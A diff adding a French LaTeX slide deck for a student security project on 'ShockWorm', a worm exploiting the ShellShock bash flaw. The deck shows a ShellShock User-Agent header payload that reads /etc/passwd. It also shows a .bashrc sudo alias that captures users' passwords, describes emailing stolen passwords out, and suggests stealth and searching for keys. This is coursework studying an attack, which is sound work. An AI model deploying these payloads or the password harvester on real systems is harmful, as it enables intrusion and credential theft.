@@ -1,0 +1,194 @@
+\documentclass[11pt]{beamer}
+\usetheme{Warsaw}
+\usepackage[utf8]{inputenc}
+\usepackage[francais]{babel}
+\usepackage{amsmath}
+\usepackage{amsfonts}
+\usepackage{amssymb}
+\usepackage{graphicx}
+\usepackage{listings}
+\lstset{ % General setup for the package
+	language=bash,
+	basicstyle=\small\sffamily,
+	numbers=left,
+ 	numberstyle=\tiny,
+	frame=tb,
+	tabsize=4,
+	columns=fixed,
+	showstringspaces=false,
+	showtabs=false,
+	keepspaces=true,
+	breaklines=true,
+	moredelim=[is][\color{red}\underbar]{_}{_}
+}
+\AtBeginSection[]{
+  \begin{frame}
+  \vfill
+  \centering
+  \begin{beamercolorbox}[sep=8pt,center,shadow=true,rounded=true]{title}
+    \usebeamerfont{title}\insertsectionhead\par%
+  \end{beamercolorbox}
+  \vfill
+  \end{frame}
+}
+\author{Mathieu Valois - M1 Informatique - \\ 21102894@etu.unicaen.fr}
+\title{ShockWorm - Un ver basé sur ShellShock}
+%\setbeamercovered{transparent} 
+%\setbeamertemplate{navigation symbols}{} 
+\logo{\includegraphics[scale=0.3]{images/cc-by-nc-sa.png}  \includegraphics[scale=0.1]{images/shellshock.png}  \includegraphics[scale=0.5]{images/unicaen_logo_rvb_noir_V2.png}}
+\institute{Université de Caen Basse-Normandie} 
+%\date{} 
+%\subject{} 
+\expandafter\def\expandafter\insertshorttitle\expandafter{%
+  \insertshorttitle\hfill%
+  \insertframenumber\,/\,\inserttotalframenumber}
+\begin{document}
+%\lstset{inputencoding=utf8/latin1}
+\setbeamertemplate{headline}{}
+\begin{frame}
+\titlepage
+\end{frame}
+
+\begin{frame}
+\tableofcontents
+\end{frame}
+
+\section{Qu'est-ce qu'un ver ?}
+\begin{frame}{Qu'est-ce qu'un ver ?}
+\begin{itemize}
+\item un programme informatique capable de s'auto-répliquer
+\item à la différence des virus, le ver se déplace seul sans programme hôte
+\item requiert une vulnérabilité du système pour y pénétrer
+\item peut être bienveillant ou malveillant
+\item se déplace bien plus rapidement que les virus à travers les réseaux car il ne demande pas d'interaction des utilisateurs
+\end{itemize}
+\begin{center}
+\includegraphics[scale=0.1]{images/worm.jpeg}
+\end{center}
+\end{frame}
+
+\section{Le but du projet}
+\begin{frame}{Le but du projet}
+\begin{itemize}
+\item programmer un ver, si possible n'existant pas déjà, qui peut se répliquer de machine en machine
+\item choisir une vulnérabilité connue à utiliser pour permettre au ver d'attaquer des machines exposées à cette vulnérabilité
+\item lâcher le ver dans un réseau confiné de machines vulnérables pour voir la progression du ver
+\end{itemize}
+\end{frame}
+
+\section{La vulnérabilité : ShellShock}
+\begin{frame}{La vulnérabilité : ShellShock}
+\noindent
+ \parbox[t]{8cm}{
+ShellShock est : 
+\begin{itemize}
+\item une vulnérabilité de Bash
+\item introduite dans le code de bash en 1989 (d'après Brian Fox, le principal développeur)  et découverte en septembre 2014 (ce qui fait un bout de temps)
+\item sachant que bash est massivement utilisé dans tout les systèmes UNIX, ShellShock était présente sur énormément de machines, des serveurs jusqu'au systèmes embarqués en passant par les caméras IP
+\end{itemize}}
+     \hfill
+       \raisebox{\dimexpr-\height+\baselineskip}{\includegraphics[scale=0.1]{images/brian_fox.png}}
+\end{frame}
+
+\section{Un peu de technique pour comprendre}
+\begin{frame}[fragile]{Un peu de technique pour comprendre}
+
+Soit ce bloc de code bash:
+
+\begin{lstlisting}
+$ env myfunction='() { echo "hello world"; } _'_ \
+bash -c "myfunction;"
+\end{lstlisting}
+Cela déclare une fonction qui affiche "hello world" et appelle un sous-processus pour exécuter cette toute nouvelle fonction.
+\end{frame}
+
+\begin{frame}[fragile]{Un peu de technique pour comprendre}
+Soit maintenant ce bloc de code:
+
+\begin{lstlisting}
+$ env myfunction='() { echo "hello world"; } \
+echo "shellshock attaque !" _'_ \
+bash -c "myfunction;"
+\end{lstlisting}
+
+Soyez attentif au guillemet final de la déclaration de la fonction (souligné en rouge). Dans ce deuxième bloc de code, il est mal placé et force ainsi le sous-processus à exécuter la deuxième ligne ("shellshock attaque !") AVANT même la fonction en elle-même.
+
+\end{frame}
+
+\begin{frame}[fragile]{Comment l'exploiter ?}
+
+On s'est rendu compte que beaucoup de sites web utilisent des scripts bash pour l'affichage de contenu : c'est ce qu'on appelle les CGI (Common Gateway Interface).
+
+Il est alors possible d'injecter ce genre de code dans les en-têtes HTTP, de cette manière :
+
+\begin{lstlisting}
+$ "User-Agent: '() { :;}; cat /etc/passwd' bash -c echo"
+\end{lstlisting}
+
+Ce code copie tous les mots de passe (heureusement hachés salés) de la machine distante sur laquelle est présent le script CGI vulnérable, et les affiche sur la page web.
+
+\end{frame}
+
+\begin{frame}{Comment l'exploiter ?}
+Tous les protocoles qui utilisent bash rien qu'un petit peu sont susceptibles d'être ciblés. Il y a eu des attaques contre des serveurs DHCP (et aussi clients), DNS, HTTP et d'autres. 
+Les attaques utilisent le même bout de code que précédemment, à quelques détails près.
+
+\end{frame}
+
+
+\section{Les capacités du ver}
+\begin{frame}{Les capacités du ver}
+
+\begin{itemize}
+\item infecter une nouvelle machine vulnérable
+\item persiste aux redémarrages sans et avec permission root 
+\item intercepte les mots de passe en surchargeant la commande sudo
+\item une fois quelques mots de passe capturés, il les envoie par mail à l'adresse définie, accompagnés des adresses IP de la machine
+\end{itemize}
+
+
+\begin{center}
+\includegraphics[scale=0.08]{images/linux_force.jpg}
+\end{center}
+\end{frame}
+
+\section{Capturer les mots de passe}
+\begin{frame}[fragile]{Capturer les mots de passe}
+Pour capturer les mots de passe des utilisateurs, on définit un alias \textbf{sudo} en écrivant ceci dans le \textbf{.bashrc} de chaque utilisateur : 
+\begin{lstlisting}
+capture(){
+    echo -n "[sudo] password for $USER: " && 
+    read -rs password && 
+    echo "$password:$(whoami)" >> /tmp/passwords && 
+    echo "$password" | /usr/bin/sudo -S "$@"
+}
+alias sudo=capture;
+\end{lstlisting}
+
+\end{frame}
+
+\section{Certaines améliorations possibles}
+\begin{frame}{Certaines améliorations possibles}
+\begin{itemize}
+\item être plus discret en empêchant les commandes de "monitoring" (ps, netstat, ...) de voir le processus
+\item récupérer plus d'informations sur les utilisateurs de façon automatique
+\item rechercher sur le système des clés de chiffrement qui pourraient être intéressantes
+\item rechercher des documents sensibles
+\end{itemize}
+\end{frame}
+
+\section{Démo infection}
+
+\section{Questions ?}
+
+\begin{frame}{Pourquoi ce projet ?}
+\begin{itemize}
+\item j'ai lu quelques ouvrages à ce sujet, j'avais donc quelques savoirs qui m'ont aidé
+\item la découverte publique de ShellShock s'est faite pile au moment où nous devions choisir les projets
+\item sujet orienté recherche plutôt que d'écriture de code
+\item lié à la sécurité, domaine que j'apprécie particulièrement
+\item il n'y avait pas vraiment d'autres sujets intéressants selon moi pour les E-Secure
+\end{itemize}
+\end{frame}
+
+\end{document}
